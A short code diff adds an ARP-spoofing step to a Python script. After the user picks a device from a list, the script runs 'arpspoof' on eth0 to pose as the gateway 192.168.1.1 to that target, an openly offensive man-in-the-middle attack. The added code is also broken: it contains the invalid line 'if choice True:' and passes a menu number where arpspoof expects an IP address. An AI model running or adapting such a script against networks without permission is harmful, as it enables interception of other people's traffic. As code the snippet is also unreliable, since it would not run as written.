@@ -35,3 +35,8 @@ print("\n")
 
 choice = input("Enter the number of the device you want to arp spoofing -> ")
 
+if choice True:
+    subprocess.run(
+	["arpspoof", "-i", "eth0", "-t", choice, "192.168.1.1"]
+    )
+
